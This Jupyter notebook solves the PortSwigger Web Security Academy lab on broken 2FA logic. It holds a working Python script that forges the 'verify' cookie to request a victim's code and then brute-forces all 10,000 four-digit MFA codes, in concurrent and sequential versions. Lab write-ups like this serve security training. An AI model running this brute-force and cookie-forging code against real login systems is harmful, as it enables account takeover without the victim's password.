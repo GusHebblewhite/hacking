{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ad013a31",
   "metadata": {},
   "source": [
    "# 2FA Broken Logic\n",
    "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic\n",
    "\n",
    "Process:\n",
    "1. Login with our own account (getting an MFA token)\n",
    "2. Use the cookie with the target username to send an MFA token to them\n",
    "3. Brute force their MFA token\n",
    "4. Now we've logged in without even needing their password!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "517ac8b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.cookies import cookiejar_from_dict as cfd"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3015393",
   "metadata": {},
   "source": [
    "### 1. Login"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc773fe1",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://acc51fe81fed1ca9c0992cb6000200fa.web-security-academy.net/\"\n",
    "\n",
    "my_credentials = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "\n",
    "#Post to the initial login screen (triggering the MFA token to be emailed to us)\n",
    "s = requests.session()\n",
    "r = s.post(URL + \"login\", data=my_credentials)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75b04e3b",
   "metadata": {},
   "outputs": [],
   "source": [
    "s.cookies.get_dict()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ec8a857b",
   "metadata": {},
   "source": [
    "### 2. Send Target MFA Code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3024816",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Specify target:\n",
    "target = \"carlos\"\n",
    "\n",
    "#Get and modify cookies\n",
    "cookies = s.cookies.get_dict()\n",
    "cookies['verify'] = target\n",
    "\n",
    "r = s.get(URL + \"login2\", cookies=cfd(cookies))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7e07da54",
   "metadata": {},
   "source": [
    "### 3. Brute Force MFA Token"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65b405ba",
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "import asyncio\n",
    "import async_timeout\n",
    "import tqdm.notebook as tq\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecbbbad2",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Makw MFA code data\n",
    "all_tokens = [\"0\"*(4-len(str(x))) + str(x) for x in range(10000)]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30b8dd13",
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import asyncio\n",
    "from timeit import default_timer\n",
    "from aiohttp import ClientSession\n",
    "import requests\n",
    "\n",
    "def fetch_async(url, target, all_tokens):\n",
    "    loop = asyncio.get_event_loop() \n",
    "    future = asyncio.ensure_future(fetch_all(url, target, all_tokens)) \n",
    "    tasks = loop.run_until_complete(future) \n",
    "    return tasks\n",
    "    \n",
    "async def fetch_all(url, target, all_tokens):\n",
    "    tasks = []\n",
    "    async with ClientSession() as session:\n",
    "        for each_token in all_tokens:\n",
    "            task = asyncio.ensure_future(fetch(url, target, each_token, session))\n",
    "            tasks.append(task) \n",
    "        _ = await asyncio.gather(*tasks) \n",
    "    return tasks\n",
    "\n",
    "async def fetch(url, target, each_token, session):\n",
    "    async with session.post(url, data={\"mfa-code\" : each_token}, cookies=cfd({\"verify\" : target})) as response:\n",
    "        r = await response.read()\n",
    "        return r\n",
    "\n",
    "result = fetch_async(URL + \"login2\", target, all_tokens)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3e43dcb1",
   "metadata": {},
   "source": [
    "Yay this works!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0705a32c",
   "metadata": {},
   "source": [
    "# Attempt 2 - using simpler code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a83d57f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "import asyncio\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()\n",
    "\n",
    "async def fetch(client, each_token):\n",
    "    async with client.post(URL + \"login2\", data={\"mfa-code\" : each_token}, cookies=cfd({\"verify\" : target})) as resp:\n",
    "        return await resp.text()\n",
    "\n",
    "async def main():\n",
    "    async with aiohttp.ClientSession() as client:\n",
    "        results = []\n",
    "        for each_token in all_tokens[:1000]:\n",
    "            results.append(len(await fetch(client, each_token)))\n",
    "    return results\n",
    "        \n",
    "a = asyncio.run(main())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "91e2edf2",
   "metadata": {},
   "source": [
    "This appears to work, but might be slower..."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
